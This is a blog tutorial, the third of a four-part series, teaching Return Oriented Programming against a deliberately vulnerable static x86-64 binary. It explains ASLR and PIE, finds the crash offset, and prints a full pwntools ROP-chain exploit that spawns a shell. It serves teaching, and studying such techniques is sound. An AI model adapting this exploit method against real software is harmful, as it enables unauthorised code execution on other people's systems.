@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.52" />
+
+    
+    
+    
+
+<title>PWN 3/4 : SaperliROPette ! • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PWN 3/4 : SaperliROPette !"/>
+<meta name="twitter:description" content="Introduction to Return Oriented Programming (ROP) and practical example."/>
+
+<meta property="og:title" content="PWN 3/4 : SaperliROPette !" />
+<meta property="og:description" content="Introduction to Return Oriented Programming (ROP) and practical example." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.github.io/en/hacking/pwn_3of4_saperliropette/" /><meta property="article:published_time" content="2018-05-09T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-05-09T00:00:00&#43;00:00"/>
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.github.io//en">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.github.io//en">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.github.io/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.github.io//en">
+         Infosec, Coding, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/thelaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/TheLaluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/DeveLooper" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <div class="langSection">
+    
+    <a rel="alternate" href="/en/hacking/pwn_3of4_saperliropette/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
+    
+    <a rel="alternate" href="/fr/hacking/pwn_3of4_saperliropette/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
+    </div>
+    <p class="copyright">
+      &copy; 2019 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>PWN 3/4 : SaperliROPette !</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> May 9, 2018
+    
+    
+    <i class="fas fa-clock"></i> 6 min read
+    <i class="fas fa-globe"></i> translated<br/>
+    <i class="fas fa-heart"></i>
+    
+    Any typos? Any idea to suggest? Feedback appreciated!
+    <i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<blockquote>
+<p>Small edit after the initial publication of the articles:</p>
+
+<p>These four articles lead me to give an &ldquo;pwn introductory&rdquo; conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">here</a> and the video (French only) here :</p>
+</blockquote>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<h2 id="pwn-road-third-stop-welcome-aboard">Pwn Road, third stop, welcome aboard!</h2>
+
+<p>Yesterday, the simple buffer overflow and ret2libc, today, ROP, or Return Oriented Programming, and tomorrow&hellip; Tomorrow the conquest of the world!</p>
+
+<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" ></p>
+
+<p>I left you yesterday on the ret2libc, which, seen from afar, consists in picking in the libc the functions that interest us the most. Except that this attack is not possible in the case where the program is compiled statically, and hardly feasible if the ASLR is enabled. Today we will discover the ROP that allows us to bypass these protections.</p>
+
+<p>It looks more and more like the cat and mouse game, so&hellip; <br />
+Follow the leader cat!</p>
+
+<h2 id="aslr-and-pic-details">ASLR and PIC details</h2>
+
+<p>Before we start, a little feedback on these sometimes confusing protections.</p>
+
+<p>The ASLR is configured through <code>/proc/sys/kernel/randomize_va_space</code>. It can be set to 0=off, 1=on (stack and heap), 2=on (1 + .data). The value 2 being the new standard being adopted, which is already effective for the most part.</p>
+
+<p>The ASLR therefore leaves a whole non-randomized attack surface. So what had to happen happened: attacks using the sections .text, .data, .got, .plt, &hellip;</p>
+
+<p>More information on the different sections and structure of an ELF here: <a href="https://www.cs.stevens.edu/~jschauma/631A/elf.html">ELF_format</a></p>
+
+<p>As the ASLR is not sufficient, new protections have been put in place: PIC / PIE (Position Independent Code / Executable). The mainidea is simple&hellip; How about we randomize&hellip; EVERYTHING?!</p>
+
+<p>ROP works with partial or total ASLR, but is countered by the latest measure&hellip;</p>
+
+<p>Following at the next countermeasure! è.é</p>
+
+<h2 id="presentation-of-the-technique">Presentation of the technique</h2>
+
+<p>Return&hellip; Oriented&hellip; Programming&hellip;</p>
+
+<p>Um um&hellip; Programming&hellip; With&hellip; Return? °^°&rsquo;</p>
+
+<p>We&rsquo;re going to take advantage of the fact that the .text section of the program is still in the same place to pick up a lot of little pieces of code called gadgets, and assemble them to do our exploit. The exploit is therefore a series of addresses pointing at assembler, so in the absolute, we can do everything with it. The only limit? The gadgets that are available in the program&hellip;</p>
+
+<p>Even if we &ldquo;can do everything&rdquo;, the most common strategy remains to do as in article 1 where we generate a shellcode which, via a syscall, allows us to execute a program of our choice.</p>
+
+<p>An important thing to note here: We need gadgets. Gadgets are code that doesn&rsquo;t move. Libraries are always relocated. So a program based on libraries will have a much smaller attack surface than a program compiled in static that would contain all the code it needs. Also, the larger the program will be and the more complex actions it&rsquo;ll do, the more likely you&rsquo;ll find interesting stuff inside. Capich? Noice!</p>
+
+<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" ></p>
+
+<p>Now, let&rsquo;s go more into detail about gadgets, shall we?</p>
+
+<p>They must all meet a major criterion: End with a ret instruction.</p>
+
+<p>It is this criterion that makes the attack possible. Indeed, when we control the instruction pointer, we will make it execute a first gadget. When it&rsquo;ll reach the final ret instruction, the previous saved instruction pointer will be restored the execution will continue on the stack (which we just overflowed). But the next address will be the one of the second gadget and so on.</p>
+
+<p>However, if your gadget ends with a ret, but contains instructions that modify the execution flow of the program, it may break your exploit. So no <code>call</code>, no <code>leave</code>, no <code>double ret</code>, no arms, and above all: no chocolate.</p>
+
+<p>Many tools are available to list the gadgets of an executable, such as ROPgadget, Ropper, XRop, &hellip;</p>
+
+<h2 id="elaboration-of-the-exploit">Elaboration of the exploit</h2>
+
+<p>The studied binary is downloadable <a href="/hacking/pwn_3of4_saperliropette/vuln">here</a></p>
+
+<p>First of all, we look at what we&rsquo;re dealing with: x86-64, compiled in static, full ASLR. Okay!</p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" ></p>
+
+<p>You&rsquo;re used to it now, the classic one:</p>
+
+<p>Understand how the program works, find the crash, then the offset!</p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" ></p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" ></p>
+
+<p>Here again, we see that we crash on a ret&hellip; Do we control RSP? Yes! Offset? 264!</p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" ></p>
+
+<p>Small reminder, ret has the effect of placing what RSP points to (so the last element of the stack), in RIP. So we have RIP under our control. So&hellip; RIP!</p>
+
+<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" ></p>
+
+<p>We then use the ropgadget tool which offers us a superb ropchain made with our vulnerable program:</p>
+
+<pre><code class="language-shell">$ ropgadget --binary vuln --ropchain
+</code></pre>
+
+<p>The output is long (verbose), I only put part of it:</p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" ></p>
+
+<p>So we make it a python file, our exploit is the following:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = &quot;debug&quot;
+
+offset = 264
+payload = &quot;A&quot; * offset
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x000000000043167d)  # pop rax ; ret
+payload += '/bin//sh'
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x000000000040158b)  # pop rdi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x0000000000432ef5)  # pop rdx ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x0000000000453b50) * 59 # add rax, 1 ; ret
+payload += p64(0x00000000004546e5)  # syscall ; ret
+
+p = process(&quot;./vuln&quot;)
+p.recv()
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre>
+
+<p>Isn&rsquo;t it beautiful all this automation? Well, it doesn&rsquo;t always work, but when it works, the time saved is huge, especially in CTF&hellip; ;)</p>
+
+<p>We will now exploit it:</p>
+
+<p><img class="img_full" src="/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" ></p>
+
+<p>TADA, one more shell! :D</p>
+
+<p>Small detail that kills, we see here that $0 (the name of the executed program) is <code>bash</code>, whereas in our ropchain, we had <code>/bin//sh</code> (which is understood as <code>/bin/sh</code>). But that&rsquo;s normal, because on my machine, <code>/bin/sh</code> is a symbolic link that points to bash! My real sh is <code>/usr/bin/sh</code>.</p>
+
+<blockquote>
+<p>But&hellip; That doesn&rsquo;t match the previous exploits?!</p>
+</blockquote>
+
+<p>Whoa! Whoa! One that follows! Yes, indeed&hellip;<br />
+More information on this strangeness our dear beloved friens Pixis&rsquo;s website : <a href="https://beta.hackndo.com/sh-vs-bash/">sh_vs_bash</a></p>
+
+<p>That&rsquo;s it for this short introduction to ROP, I hope it blown your mind as much as mine when I found out about this attack. You now have many cards to play with: BOF / shellcode / ret2libc / ROP / brain / &hellip;</p>
+
+<p>That is why our next meeting will be based on the analysis of a more complete program. So we&rsquo;re going to conclude this series and&hellip;</p>
+
+<p>Blow up the world! <code>\o/</code></p>
+
+<p><img class="img_med" src="/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" ></p>
+
+<p>See you soon for even more pwn!</p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/en/hacking/pwn_2of4_ret2libc/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">PWN 2/4 : Return at libc, pick a shell !</span>
+    </a>
+    
+    
+    <a href="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/" class="post--navigation-next">
+      <span class="navigation-tittle">PWN 4/4 : Stack Pivot ToZeMoon !</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+        <div id="disqus_thread"></div>
+<script type="text/javascript">
+  (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    var disqus_shortname = 'thinkloveshare';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
